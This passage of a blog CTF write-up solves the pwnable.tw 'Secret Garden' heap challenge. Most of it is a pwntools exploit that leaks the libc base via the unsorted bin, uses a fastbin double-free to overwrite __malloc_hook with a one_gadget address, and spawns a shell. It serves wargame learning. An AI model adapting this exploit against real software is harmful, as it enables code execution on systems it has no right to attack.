class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        res = self.proc.readuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">        end_idx = res.find(<span class="string">b&#x27;\xe2\x98\x86&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res[:end_idx]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_flower</span>(<span class="params">self, idx</span>):</span><br><span class="line">        self.proc.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;garden:&#x27;</span>)</span><br><span class="line">        self.proc.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">        self.flower_tmp_clean -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clean_garden</span>(<span class="params">self</span>):</span><br><span class="line">        self.proc.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">        self.flower_count += self.flower_tmp_clean</span><br><span class="line">        self.flower_tmp_clean = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">app = App(io)</span><br><span class="line">app.intro()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc_base</span>():</span><br><span class="line">    app.raise_flower(<span class="number">500</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAA&#x27;</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAA&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    app.raise_flower(<span class="number">100</span>, <span class="string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>, <span class="string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    <span class="comment"># this is the object we will free so that name memory chuck</span></span><br><span class="line">    <span class="comment"># end up in unsorted bin</span></span><br><span class="line">    app.raise_flower(<span class="number">500</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    app.raise_flower(<span class="number">500</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free the object</span></span><br><span class="line">    app.remove_flower(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># allocate another object</span></span><br><span class="line">    app.raise_flower(<span class="number">400</span>, <span class="string">&#x27;AAAAAAAA&#x27;</span>, <span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print content of all the object, this is where we read the leaked data</span></span><br><span class="line">    gd_info = app.visit_garden()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># parse the data to extract the main arean address </span></span><br><span class="line">    st_idx = gd_info.find(<span class="string">b&#x27;flower[4] :AAAAAAAA&#x27;</span>) + <span class="number">19</span></span><br><span class="line">    arena_addr = u64(gd_info[st_idx:st_idx+<span class="number">6</span>] + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Arena addr : &#x27;</span> + <span class="built_in">hex</span>(arena_addr))</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Calcuate libc base address</span></span><br><span class="line">    libc_base_offset = <span class="number">0x3c3b78</span></span><br><span class="line">    log.info(<span class="string">&#x27;libc base  : &#x27;</span> + <span class="built_in">hex</span>(arena_addr - libc_base_offset))</span><br><span class="line">    <span class="keyword">return</span> arena_addr - libc_base_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stage_write</span>(<span class="params">write_addr, write_val, bin_size=<span class="number">100</span></span>):</span><br><span class="line">    <span class="string">&#x27;this function overwrites the arbitrary with arbitrary value&#x27;</span></span><br><span class="line">    <span class="comment"># heap groaming for dup fastbin attack</span></span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;AAAAA&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;AAAAA&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># initiate the fastbin attack</span></span><br><span class="line">    app.remove_flower(<span class="number">5</span>)</span><br><span class="line">    app.remove_flower(<span class="number">6</span>)</span><br><span class="line">    app.remove_flower(<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># at this stage we have fastbin(0x70) with duplicate bins</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># we put the address at which we want to write arbitrary value</span></span><br><span class="line">    app.raise_flower(bin_size, write_addr, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;junk&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># after this allocation the address we want to write will be</span></span><br><span class="line">    <span class="comment"># in fastbin</span></span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;junk&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># this allocation will return the address where want to write</span></span><br><span class="line">    <span class="comment"># the value we want to write is passed in write_val</span></span><br><span class="line">    app.raise_flower(bin_size, write_val, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Overwrite complete&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = leak_libc_base()</span><br><span class="line">libc_bin.address = libc_base</span><br><span class="line"></span><br><span class="line">malloc_hook = p64(libc_bin.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">log.info(<span class="string">&#x27;func : malloc_hook - &#x27;</span> + <span class="built_in">hex</span>(u64(malloc_hook)))</span><br><span class="line"></span><br><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line">one_gadget = p64(libc_base + one_gadget_offset)</span><br><span class="line">log.info(<span class="string">&#x27;One gadget : &#x27;</span> + <span class="built_in">hex</span>(libc_base + one_gadget_offset))</span><br><span class="line"></span><br><span class="line">stage_write(malloc_hook, p8(<span class="number">0x41</span>)*<span class="number">0x13</span> + one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger malloc_hook such that it satisfies the one gadget constrains</span></span><br><span class="line">app.remove_flower(<span class="number">9</span>)</span><br><span class="line">app.remove_flower(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># interactive shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/flag.png" alt="" /></p>
<h2 id="Conclusion"><a class="header-anchor" href="#Conclusion">#</a>Conclusion</h2>
<p>An interesting challenge on leaking libc via unsorted bins and getting arbitrary write using fastbin corruption.</p>
<h2 id="Reference"><a class="header-anchor" href="#Reference">#</a>Reference</h2>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c">Fastbin Attack Example</a></li>
<li><a target="_blank" rel="noopener" href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">Fastbin security check bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget project</a></li>
</ol>
</div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable/">pwnable</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable-tw/">pwnable-tw</a><a class="link-muted mr-2" rel="tag" href="/tags/WarGames/">WarGames</a><a class="link-muted mr-2" rel="tag" href="/tags/Heap-Exploitation/">Heap Exploitation</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/07/04/binary-exploitation-pwnable-tw-babystack/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Binary Exploitation [pwnable.tw] - BabyStack</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/06/07/binary-exploitation-pwnable-kr-level-6/"><span class="level-item">Binary Exploitation [pwnable.kr] - (Level 6) random</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/';
            this.page.identifier = '/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'taintedbits' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Challange-Description"><span class="level-left"><span class="level-item">1</span><span class="level-item">Challange Description</span></span></a></li><li><a class="level is-mobile" href="#Binary-Protection"><span class="level-left"><span class="level-item">2</span><span class="level-item">Binary Protection</span></span></a></li><li><a class="level is-mobile" href="#Vulnerable-Application"><span class="level-left"><span class="level-item">3</span><span class="level-item">Vulnerable Application</span></span></a></li><li><a class="level is-mobile" href="#Vulnerability"><span class="level-left"><span class="level-item">4</span><span class="level-item">Vulnerability</span></span></a></li><li><a class="level is-mobile" href="#The-Leak-Read-Primitive"><span class="level-left"><span class="level-item">5</span><span class="level-item">The Leak - Read Primitive</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Smallbin-Leak"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">Smallbin Leak</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Write-Primitive"><span class="level-left"><span class="level-item">6</span><span class="level-item">Write Primitive</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Fastbin-Security-Check-Bypass"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">Fastbin Security Check Bypass</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Exploit-Shellcode"><span class="level-left"><span class="level-item">7</span><span class="level-item">Exploit Shellcode</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#One-Gadget"><span class="level-left"><span class="level-item">7.1</span><span class="level-item">One Gadget</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Exploit"><span class="level-left"><span class="level-item">8</span><span class="level-item">Exploit</span></span></a></li><li><a class="level is-mobile" href="#Conclusion"><span class="level-left"><span class="level-item">9</span><span class="level-item">Conclusion</span></span></a></li><li><a class="level is-mobile" href="#Reference"><span class="level-left"><span class="level-item">10</span><span class="level-item">Reference</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-07-09T07:17:02.000Z">2023-07-09</time></p><p class="title"><a href="/2023/07/09/exploring-the-fundamentals-of-RISC-V-assembly-and-shellcode-series-part1/">Exploring the fundamentals of RISC-V: Assembly and Shellcode Series - Part 1</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-14T18:30:00.000Z">2021-02-15</time></p><p class="title"><a href="/2021/02/15/arm-architecture-webinar/">ARM Architecture and Shellcode Webinars</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title"><a href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title"><a href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title"><a href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Binary-Exploitation/"><span class="level-start"><span class="level-item">Binary Exploitation</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/IoT/"><span class="level-start"><span class="level-item">IoT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Miscellaneous/"><span class="level-start"><span class="level-item">Miscellaneous</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bare-Metal/"><span class="tag">Bare-Metal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">16</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag">4</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a><p class="is-size-7"><span>&copy; 2024 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>